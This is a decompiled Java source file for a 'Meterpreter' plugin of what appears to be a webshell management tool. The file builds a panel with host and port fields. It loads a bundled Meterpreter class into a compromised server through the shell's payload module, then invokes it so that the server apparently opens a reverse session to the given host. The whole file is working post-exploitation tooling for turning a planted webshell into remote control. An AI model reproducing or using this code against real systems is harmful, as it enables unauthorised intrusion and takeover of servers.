/*
 * Decompiled with CFR 0.153-SNAPSHOT (d6f6758-dirty).
 */
package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.ui.component.RTextArea;
import core.ui.component.dialog.GOptionPane;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.io.InputStream;
import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.JTextField;
import util.Log;
import util.automaticBindClick;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(payloadName="JavaDynamicPayload", Name="JMeterpreter", DisplayName="Meterpreter")
public class Meterpreter
implements Plugin {
    private static final String CLASS_NAME = "plugin.Meterpreter";
    private final JPanel panel = new JPanel(new BorderLayout());
    private final RTextArea tipTextArea;
    private final JButton goButton;
    private final JButton loadButton;
    private final JLabel hostLabel = new JLabel("host :");
    private final JLabel portLabel = new JLabel("port :");
    private final JTextField hostTextField;
    private final JTextField portTextField;
    private final JSplitPane meterpreterSplitPane;
    private boolean loadState;
    private ShellEntity shellEntity;
    private Payload payload;
    private Encoding encoding;

    public Meterpreter() {
        this.loadButton = new JButton("Load");
        this.goButton = new JButton("Go");
        this.tipTextArea = new RTextArea();
        this.hostTextField = new JTextField("127.0.0.1", 15);
        this.portTextField = new JTextField("4444", 7);
        this.meterpreterSplitPane = new JSplitPane();
        this.meterpreterSplitPane.setOrientation(0);
        this.meterpreterSplitPane.setDividerSize(0);
        JPanel meterpreterTopPanel = new JPanel();
        meterpreterTopPanel.add(this.hostLabel);
        meterpreterTopPanel.add(this.hostTextField);
        meterpreterTopPanel.add(this.portLabel);
        meterpreterTopPanel.add(this.portTextField);
        meterpreterTopPanel.add(this.loadButton);
        meterpreterTopPanel.add(this.goButton);
        this.meterpreterSplitPane.setTopComponent(meterpreterTopPanel);
        this.meterpreterSplitPane.setBottomComponent(new JScrollPane(this.tipTextArea));
        this.initTip();
        this.panel.add(this.meterpreterSplitPane);
    }

    private void loadButtonClick(ActionEvent actionEvent) {
        block5: {
            if (!this.loadState) {
                try {
                    InputStream inputStream = this.getClass().getResourceAsStream("assets/Meterpreter.classs");
                    byte[] data = functions.readInputStream(inputStream);
                    inputStream.close();
                    if (this.payload.include(CLASS_NAME, data)) {
                        this.loadState = true;
                        GOptionPane.showMessageDialog(this.panel, "Load success", "\u63d0\u793a", 1);
                        break block5;
                    }
                    GOptionPane.showMessageDialog(this.panel, "Load fail", "\u63d0\u793a", 2);
                } catch (Exception e) {
                    Log.error(e);
                    GOptionPane.showMessageDialog(this.panel, e.getMessage(), "\u63d0\u793a", 2);
                }
            } else {
                GOptionPane.showMessageDialog(this.panel, "Loaded", "\u63d0\u793a", 1);
            }
        }
    }

    private void goButtonClick(ActionEvent actionEvent) {
        String host = this.hostTextField.getText().trim();
        String port = this.portTextField.getText().trim();
        ReqParameter reqParamete = new ReqParameter();
        reqParamete.add("host", host);
        reqParamete.add("port", port);
        byte[] result = this.payload.evalFunc(CLASS_NAME, "run", reqParamete);
        String resultString = this.encoding.Decoding(result);
        Log.log(resultString, new Object[0]);
        GOptionPane.showMessageDialog(this.panel, resultString, "\u63d0\u793a", 1);
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload = this.shellEntity.getPayloadModule();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    private void initTip() {
        try {
            InputStream inputStream = this.getClass().getResourceAsStream("assets/meterpreterTip.txt");
            this.tipTextArea.setText(new String(functions.readInputStream(inputStream)));
            inputStream.close();
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override
    public JPanel getView() {
        return this.panel;
    }
}

